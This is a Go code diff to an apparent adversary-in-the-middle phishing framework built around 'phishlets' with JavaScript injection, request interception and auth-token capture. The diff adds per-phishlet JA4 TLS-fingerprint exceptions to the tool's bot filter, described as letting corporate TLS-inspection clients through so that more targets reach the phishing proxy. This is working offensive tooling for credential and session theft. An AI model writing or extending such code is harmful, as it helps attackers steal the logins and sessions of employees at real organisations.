@@ -132,6 +132,24 @@ type Phishlet struct {
 	intercept        []Intercept
 	customParams     map[string]string
 	isTemplate       bool
+	// per-phishlet botguard JA4 exceptions (corporate TLS-inspection
+	// variants) — OR-merged with the node-level -bg-ja4 allowlist
+	bgJA4Allow []string
+}
+
+// bgJA4PrefixRe — a JA4 prefix is lowercase alphanumeric (the FoxIO format),
+// at least 4 characters long (family + ciphers slice).
+var bgJA4PrefixRe = regexp.MustCompile(`^[a-z0-9]{4,}$`)
+
+// BgJA4Allow returns the phishlet's botguard JA4 exception prefixes.
+func (p *Phishlet) BgJA4Allow() []string {
+	return p.bgJA4Allow
+}
+
+// IsJA4Allowed reports whether the given JA4 fingerprint matches any of this
+// phishlet's exception prefixes (used alongside the node-level allowlist).
+func (p *Phishlet) IsJA4Allowed(ja4 string) bool {
+	return ja4PrefixMatch(ja4, p.bgJA4Allow)
 }
 
 type ConfigParam struct {
@@ -234,6 +252,7 @@ type ConfigPhishlet struct {
 	JsInject    *[]ConfigJsInject   `mapstructure:"js_inject"`
 	Intercept   *[]ConfigIntercept  `mapstructure:"intercept"`
 	RewriteUrls *[]ConfigRewriteUrl `mapstructure:"rewrite_urls"`
+	BgJA4Allow  []string            `mapstructure:"bg_ja4_allow"`
 }
 
 func NewPhishlet(site string, path string, customParams *map[string]string, cfg *Config) (*Phishlet, error) {
@@ -268,6 +287,7 @@ func (p *Phishlet) Clear() {
 	p.forcePost = []ForcePost{}
 	p.customParams = make(map[string]string)
 	p.isTemplate = false
+	p.bgJA4Allow = []string{}
 }
 
 func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[string]string) error {
@@ -528,6 +548,23 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			if err := p.addRewriteUrl(*ru.From, *ru.To, ru.QueryMap, ru.Drop); err != nil {
 				return err
 			}
+		}
+	}
+	// per-phishlet botguard JA4 exceptions — corporate TLS-inspection variants;
+	// OR-merged with the node-level -bg-ja4 allowlist at scoring time
+	if fp.BgJA4Allow != nil {
+		for _, pref := range fp.BgJA4Allow {
+			pref = strings.ToLower(strings.TrimSpace(pref))
+			if pref == "" {
+				continue
+			}
+			if !bgJA4PrefixRe.MatchString(pref) {
+				return fmt.Errorf("bg_ja4_allow: invalid JA4 prefix %q (want lowercase alphanumeric, min 4 chars)", pref)
+			}
+			p.bgJA4Allow = append(p.bgJA4Allow, pref)
+		}
+		if len(p.bgJA4Allow) > 0 {
+			log.Info("phishlet %s: %d botguard JA4 exception(s)", p.Name, len(p.bgJA4Allow))
 		}
 	}
 	for _, at := range *fp.AuthTokens {
